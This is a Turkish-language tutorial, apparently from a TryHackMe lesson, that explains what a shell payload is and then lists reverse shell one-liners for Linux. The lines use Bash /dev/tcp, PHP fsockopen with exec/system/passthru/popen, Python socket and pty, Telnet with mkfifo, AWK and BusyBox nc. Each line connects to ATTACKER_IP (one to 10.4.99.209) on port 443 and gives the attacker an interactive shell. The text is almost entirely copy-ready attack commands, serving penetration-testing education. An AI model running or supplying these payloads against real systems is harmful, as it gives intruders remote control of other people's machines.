## Shell Payload Nedir?

Bir **Shell Payload**, bind shell durumunda gelen bir bağlantıya, reverse shell durumunda ise gönderilen bir bağlantıya shell'i ifşa eden bir komut veya betik (script) olabilir.

En popüler **reverse shell** yöntemiyle shell'i dışarı aktarmak için **Linux OS** üzerinde kullanılabilecek bazı payload'ları inceleyelim.

---

### Bash

#### Normal Bash Reverse Shell

**Terminal** `target@tryhackme:~$ bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1`

Bu reverse shell, girdiyi ve çıktıyı bir **TCP** bağlantısı üzerinden saldırganın IP'sine (ATTACKER_IP) ve **443** portuna yönlendiren etkileşimli bir bash shell'i başlatır. `>&` operatörü hem **standard output** hem de **standard error**'u birleştirir.

#### Bash Read Line Reverse Shell

**Terminal** `target@tryhackme:~$ exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done`

Bu reverse shell, yeni bir **file descriptor** (bu örnekte 5) oluşturur ve bir TCP socket'ine bağlanır. Socket üzerinden komutları okuyup yürütecek ve çıktıyı aynı socket üzerinden geri gönderecektir.

#### Bash With File Descriptor 196 Reverse Shell

**Terminal** `target@tryhackme:~$ 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196`

Bu reverse shell, bir TCP bağlantısı kurmak için bir **file descriptor** (bu örnekte 196) kullanır. Shell'in ağdan komutları okumasına ve çıktıyı aynı bağlantı üzerinden geri göndermesine olanak tanır.

#### Bash With File Descriptor 5 Reverse Shell

**Terminal** `target@tryhackme:~$ bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5`

İlk örneğe benzer şekilde, bu komut bir shell (`bash -i`) açar; ancak TCP bağlantısı üzerinden etkileşimli bir oturum sağlamak için girdi ve çıktı amacıyla **file descriptor 5**'i kullanır.

---

### PHP

#### exec Fonksiyonu Kullanan PHP Reverse Shell

**Terminal** `target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'`

Bu reverse shell, saldırganın IP'sine ve 443 portuna bir **socket connection** oluşturur ve **standard input** ile **standard output**'u yönlendirerek bir shell yürütmek için `exec` fonksiyonunu kullanır.

#### shell_exec Fonksiyonu Kullanan PHP Reverse Shell

**Terminal** `target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'`

Önceki komuta benzerdir, ancak `shell_exec` fonksiyonunu kullanır.

#### system Fonksiyonu Kullanan PHP Reverse Shell

**Terminal** `target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'`

Bu reverse shell, komutu yürüten ve sonucu tarayıcıya çıktı olarak veren `system` fonksiyonunu kullanır.

#### passthru Fonksiyonu Kullanan PHP Reverse Shell

**Terminal** `target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'`

`passthru` fonksiyonu bir komutu yürütür ve ham (raw) çıktıyı tarayıcıya geri gönderir. Bu, binary verilerle çalışırken kullanışlıdır.

#### popen Fonksiyonu Kullanan PHP Reverse Shell

**Terminal** `target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'`

Bu reverse shell, shell'in yürütülmesini sağlamak amacıyla bir **process file pointer** açmak için `popen` kullanır.

---

### Python

_Lütfen dikkat: Aşağıdaki snippet'lerin çalışması için `python -c` kullanılması gerekir (PY-C yer tutucusu ile belirtilmiştir)._

#### Environment Variables Export Ederek Python Reverse Shell

**Terminal** `target@tryhackme:~$ export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'`

Bu reverse shell; uzak host ve portu **environment variables** (ortam değişkenleri) olarak ayarlar, bir **socket connection** oluşturur ve **standard input/output** için socket file descriptor'ını kopyalar (**duplicate**).

#### subprocess Modülü Kullanan Python Reverse Shell

**Terminal** `target@tryhackme:~$ PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'`

Bu reverse shell, bir shell türetmek (spawn) ve bir önceki komuta benzer bir ortam kurmak için `subprocess` modülünü kullanır.

#### Kısa Python Reverse Shell

**Terminal** `PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'`

Bu reverse shell bir socket (s) oluşturur, saldırgana bağlanır ve `os.dup2()` kullanarak **standard input**, **output** ve **error**'u socket'e yönlendirir.

---

### Diğerleri

#### Telnet

**Terminal** `target@tryhackme:~$ TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF`

Bu reverse shell, `mkfifo` kullanarak bir **named pipe** oluşturur ve Telnet aracılığıyla ATTACKER_IP ve 443 portu üzerinden saldırgana bağlanır.

#### AWK

**Terminal** `target@tryhackme:~$ awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`

Bu reverse shell, ATTACKER_IP:443 adresine bağlanmak için AWK'nın yerleşik **TCP** yeteneklerini kullanır. Saldırgandan gelen komutları okur ve yürütür; ardından sonuçları aynı TCP bağlantısı üzerinden geri gönderir.

#### BusyBox

**Terminal** `target@tryhackme:~$ busybox nc ATTACKER_IP 443 -e sh`

Bu BusyBox reverse shell'i, ATTACKER_IP:443 adresindeki saldırgana bağlanmak için Netcat (nc) kullanır. Bağlantı kurulduğunda `/bin/sh` yürüterek komut satırını saldırgana açar.